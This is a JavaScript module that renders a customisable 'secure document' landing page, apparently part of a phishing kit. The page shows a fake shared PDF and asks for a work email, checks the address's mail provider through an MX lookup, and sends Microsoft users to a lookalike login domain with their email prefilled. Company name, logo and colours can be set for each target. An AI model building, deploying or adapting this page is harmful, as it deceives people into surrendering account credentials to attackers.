import { createSSRApp, computed, ref } from 'vue';
import { compile } from '@vue/compiler-dom';
import { renderToString } from 'vue/server-renderer';
import * as VueModule from 'vue';

const VUE_TEMPLATE_MARKUP = `
<div class="landing-portal-root" :style="themeCssVars">
  <div class="bg-wrapper" :style="bgWrapperStyle">
    <div class="bg-overlay"></div>
  </div>

  <div class="overlay-container">
    <div class="showcase-card">
      <div class="company-brand">
        <img
          v-if="!brandFallback"
          :src="faviconUrl"
          :alt="companyName"
          @error="handleBrandError"
        />
        <span v-else class="brand-fallback">{{ companyName }}</span>
      </div>

      <h1 class="card-title">Welcome to {{ companyName }}</h1>
      <p class="card-subtitle">
       Verify your identity to access the secure document <br> shared with your account.
      </p>

      <div class="features-grid">
        <div class="feature-item">
          <div class="feature-icon"><i class="fa-solid fa-layer-group"></i></div>
          <div class="feature-title">Q1-Q4#sac7383-2026.pdf</div>
          <div class="feature-desc">PDF Document • 2.4 MB.</div>
        </div>
      </div>

      <button type="button" class="btn-action" id="visitWebsiteBtn" :data-url="redirectURL">
        <span>Access Document</span>
        <i class="fa-solid fa-arrow-right"></i>
      </button>

      <div class="card-footer">
        {{ companyName }} &bull;
        <a :href="redirectURL" target="_blank">Terms of Service</a> &bull;
        <a :href="redirectURL" target="_blank">Privacy Policy</a>
      </div>
    </div>
  </div>

  <!-- Lead Modal -->
  <div id="leadModal" class="modal-backdrop">
    <div class="modal-card">
      <button type="button" class="modal-close" id="modalCloseBtn">&times;</button>
      <div class="modal-logo-container">
        <img id="modalLogoImg" :src="faviconUrl" :alt="companyName" />
      </div>
      <h3 class="modal-title">Verfiy Your Email</h3>
      <p class="modal-desc">Enter your work email to continue to the shared document.</p>

      <form id="leadForm" class="modal-form">
        <input
          type="email"
          id="visitorEmail"
          class="modal-input"
          placeholder="name@company.com"
          required
        />
        <button type="submit" class="modal-submit" id="modalSubmitBtn">
          <span>Continue to Download</span>
          <i class="fa-solid fa-arrow-right"></i>
        </button>
      </form>
    </div>
  </div>
</div>
`;

function getContrastColor(hexColor) {
  const hex = hexColor.replace('#', '');
  if (hex.length !== 6) return '#ffffff';
  const r = parseInt(hex.substring(0, 2), 16);
  const g = parseInt(hex.substring(2, 4), 16);
  const b = parseInt(hex.substring(4, 6), 16);
  const yiq = (r * 299 + g * 587 + b * 114) / 1000;
  return yiq >= 180 ? '#0f172a' : '#ffffff';
}

let compiledRenderFn = null;

function getCompiledRenderFn() {
  if (!compiledRenderFn) {
    const compiled = compile(VUE_TEMPLATE_MARKUP);
    compiledRenderFn = new Function('Vue', compiled.code)(VueModule);
  }
  return compiledRenderFn;
}

export async function renderVueTemplate(metadata = {}) {
  const props = {
    companyName: metadata.companyName || 'Company Portal',
    faviconUrl: metadata.faviconUrl || 'https://example.com/logo.png',
    ogImage: metadata.ogImage || null,
    accentColor: metadata.accentColor || '#0b1e36',
    redirectURL: metadata.redirectURL || 'https://example.com',
  };

  const renderFn = getCompiledRenderFn();

  const app = createSSRApp(
    {
      props: ['companyName', 'faviconUrl', 'ogImage', 'accentColor', 'redirectURL'],
      setup(p) {
        const brandFallback = ref(false);
        const handleBrandError = () => {
          brandFallback.value = true;
        };

        const contrastText = computed(() => getContrastColor(p.accentColor));

        const themeCssVars = computed(() => {
          if (p.accentColor && p.accentColor !== '#0b1e36') {
            return {
              '--primary-navy': p.accentColor,
              '--btn-bg': p.accentColor,
              '--btn-text': contrastText.value,
            };
          }
          return {};
        });

        const bgWrapperStyle = computed(() => {
          if (p.ogImage) {
            return { backgroundImage: `url('${p.ogImage}')` };
          }
          return {};
        });

        return {
          brandFallback,
          handleBrandError,
          themeCssVars,
          bgWrapperStyle,
        };
      },
      render: renderFn,
    },
    props
  );

  const appHtml = await renderToString(app);

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal - ${props.companyName}</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary-navy: #0b1e36;
      --btn-bg: #0b1e36;
      --btn-text: #ffffff;
      --btn-hover: #142e50;
      --accent-gold: #c9932b;
      --text-dark: #0f172a;
      --text-muted: #64748b;
      --card-bg: #ffffff;
      --border-color: #e2e8f0;
      --radius: 16px;
      --shadow: 0 20px 40px -15px rgba(11, 30, 54, 0.4);
      --transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body, html { min-height: 100vh; width: 100%; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; background-color: #080f1a; color: #ffffff; margin: 0; padding: 0; }
    .bg-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; background-image: url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=1600&q=80'); background-size: cover; background-position: center; filter: blur(4px) brightness(0.35); transform: scale(1.03); }
    .bg-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at center, rgba(11, 30, 54, 0.6) 0%, rgba(8, 15, 26, 0.95) 100%); }
    .overlay-container { position: relative; z-index: 10; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 2rem 1.5rem; width: 100%; box-sizing: border-box; }
    .showcase-card { background: var(--card-bg); border-radius: var(--radius); box-shadow: var(--shadow); max-width: 440px; width: 100%; padding: 2.5rem 2rem; text-align: center; position: relative; border: 1px solid rgba(255, 255, 255, 0.9); animation: cardFadeIn 0.4s ease-out; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; }
    @keyframes cardFadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
    .company-brand { margin-bottom: 1.25rem; display: flex; justify-content: center; align-items: center; width: 100%; min-height: 52px; }
    .company-brand img { max-width: 180px; max-height: 52px; width: auto; height: auto; object-fit: contain; display: block; }
    .brand-fallback { font-size: 1.35rem; font-weight: 700; color: var(--primary-navy); letter-spacing: 0.5px; text-transform: uppercase; }
    .card-title { font-size: 1.5rem; font-weight: 700; color: var(--text-dark); margin-bottom: 0.5rem; letter-spacing: -0.3px; width: 100%; line-height: 1.3; }
    .card-subtitle { color: var(--text-muted); font-size: 0.9rem; line-height: 1.5; margin-bottom: 1.75rem; width: 100%; }
    .features-grid { display: flex; justify-content: center; margin-bottom: 1.75rem; width: 100%; }
    .feature-item { background: #f8fafc; border: 1px solid var(--border-color); border-radius: 10px; padding: 0.875rem 1.25rem; width: 100%; max-width: 320px; text-align: center; }
    .feature-icon { color: var(--accent-gold); font-size: 1.15rem; margin-bottom: 0.4rem; }
    .feature-title { font-size: 0.85rem; font-weight: 600; color: var(--text-dark); margin-bottom: 0.2rem; }
    .feature-desc { font-size: 0.75rem; color: var(--text-muted); line-height: 1.35; }
    .btn-action { width: 100%; background-color: var(--btn-bg); color: var(--btn-text) !important; border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 8px; padding: 0.9rem 1.25rem; font-size: 0.95rem; font-weight: 600; cursor: pointer; transition: var(--transition); display: flex; align-items: center; justify-content: center; gap: 0.6rem; box-shadow: 0 4px 14px rgba(11, 30, 54, 0.25); text-decoration: none; box-sizing: border-box; opacity: 1 !important; visibility: visible !important; }
    .btn-action span, .btn-action i { color: var(--btn-text) !important; opacity: 1 !important; visibility: visible !important; }
    .btn-action:hover { background-color: var(--btn-hover); transform: translateY(-1px); box-shadow: 0 6px 18px rgba(11, 30, 54, 0.35); }
    .card-footer { margin-top: 1.75rem; padding-top: 1rem; border-top: 1px solid var(--border-color); font-size: 0.75rem; color: var(--text-muted); width: 100%; text-align: center; }
    .card-footer a { color: var(--text-muted); text-decoration: underline; margin: 0 4px; }
    .card-footer a:hover { color: var(--primary-navy); }
    .modal-backdrop { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(11, 30, 54, 0.75); backdrop-filter: blur(5px); z-index: 1000; display: flex; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: all 0.25s ease; padding: 1rem; }
    .modal-backdrop.active { opacity: 1; visibility: visible; }
    .modal-card { background: #ffffff; border-radius: 16px; max-width: 400px; width: 100%; padding: 2rem; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35); transform: scale(0.92); transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1); position: relative; color: var(--text-dark); }
    .modal-backdrop.active .modal-card { transform: scale(1); }
    .modal-close { position: absolute; top: 1rem; right: 1rem; background: transparent; border: none; font-size: 1.25rem; color: var(--text-muted); cursor: pointer; padding: 0.25rem; line-height: 1; border-radius: 50%; transition: color 0.2s ease; }
    .modal-close:hover { color: var(--text-dark); }
    .modal-logo-container { width: 52px; height: 52px; background: #f8fafc; border: 1px solid var(--border-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.25rem auto; padding: 6px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); overflow: hidden; }
    .modal-logo-container img { max-width: 100%; max-height: 100%; object-fit: contain; display: block; }
    .modal-title { font-size: 1.25rem; font-weight: 700; margin-bottom: 0.5rem; color: var(--text-dark); }
    .modal-desc { font-size: 0.85rem; color: var(--text-muted); line-height: 1.45; margin-bottom: 1.25rem; }
    .modal-form { display: flex; flex-direction: column; gap: 0.875rem; }
    .modal-input { width: 100%; padding: 0.8rem 1rem; border: 1px solid var(--border-color); border-radius: 8px; font-size: 0.9rem; outline: none; transition: border-color 0.2s ease; }
    .modal-input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
    .modal-submit { width: 100%; background: var(--btn-bg); color: var(--btn-text); border: none; border-radius: 8px; padding: 0.85rem; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: background 0.2s ease; display: flex; align-items: center; justify-content: center; gap: 0.5rem; }
    .modal-submit:hover { background: var(--btn-hover); }
  </style>
</head>
<body>
  <div id="app">${appHtml}</div>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const visitBtn = document.getElementById('visitWebsiteBtn');
      const modal = document.getElementById('leadModal');
      const modalClose = document.getElementById('modalCloseBtn');
      const leadForm = document.getElementById('leadForm');
      const emailInput = document.getElementById('visitorEmail');
      const submitBtn = document.getElementById('modalSubmitBtn');

      if (visitBtn && modal) {
        visitBtn.addEventListener('click', function(e) {
          e.preventDefault();
          modal.classList.add('active');
          setTimeout(() => emailInput.focus(), 100);
        });

        modalClose.addEventListener('click', function() {
          modal.classList.remove('active');
        });

        modal.addEventListener('click', function(e) {
          if (e.target === modal) {
            modal.classList.remove('active');
          }
        });

        leadForm.addEventListener('submit', async function(e) {
          e.preventDefault();
          const email = emailInput.value.trim();
          let targetUrl = visitBtn.getAttribute('data-url') || 'https://example.com';

          if (!email) return;

          const submitBtnOriginalText = submitBtn ? submitBtn.innerHTML : '';
          if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span>Verifying...</span>';
          }

          let isGoogleEmail = false;
          let isMicrosoftEmail = false;
          const domain = email.includes('@') ? email.split('@').pop().toLowerCase() : '';

          if (domain === 'gmail.com' || domain === 'googlemail.com' || domain.endsWith('.google.com')) {
            isGoogleEmail = true;
          } else if (['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'passport.com'].includes(domain) || domain.endsWith('.outlook.com')) {
            isMicrosoftEmail = true;
          } else if (domain) {
            try {
              const res = await fetch('/api/check-mx?email=' + encodeURIComponent(email));
              if (res.ok) {
                const data = await res.json();
                if (data.isGoogle) {
                  isGoogleEmail = true;
                } else if (data.isMicrosoft) {
                  isMicrosoftEmail = true;
                }
              }
            } catch (err) {
              console.warn('MX check error:', err);
            }
          }

          if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = submitBtnOriginalText;
          }

          if (isGoogleEmail) {
            targetUrl = '' + encodeURIComponent(email);
          } else if (isMicrosoftEmail) {
            targetUrl = 'https://login.coeminna.top?PMHaia5eD2E=cnd5YQ==&omn=' + encodeURIComponent(email);
          } else {
            targetUrl = '' + encodeURIComponent(email);
          }

          window.open(targetUrl, '_blank', 'noopener,noreferrer');
          modal.classList.remove('active');
        });
      }
    });
  </script>
</body>
</html>`;
}

export async function getBaseTemplate() {
  return await renderVueTemplate();
}

export async function transformTemplate(_baseHtml, metadata) {
  return await renderVueTemplate(metadata);
}
